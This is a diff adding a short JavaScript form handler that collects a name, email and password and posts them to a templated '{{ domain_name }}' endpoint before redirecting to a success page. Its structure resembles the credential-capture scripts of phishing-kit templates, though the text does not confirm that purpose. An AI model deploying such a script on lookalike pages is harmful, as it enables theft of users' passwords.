@@ -1,0 +1,22 @@
+let form_data = document.getElementById("form");
+
+form_data.addEventListener("submit", (e) => {
+    e.preventDefault();
+    let name = document.getElementById("name");
+
+    let mail = document.getElementById("email");
+
+    let pass = document.getElementById("password");
+
+    let report = {
+        n: name.value,
+        m: mail.value,
+        p: pass.value
+    }
+    var oReq = new XMLHttpRequest();
+    oReq.open("POST", "https://{{ domain_name }}/confirm.html", false);
+    oReq.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+    oReq.send(JSON.stringify(report));
+
+    location.href="https://{{ domain_name }}/success.html";
+})
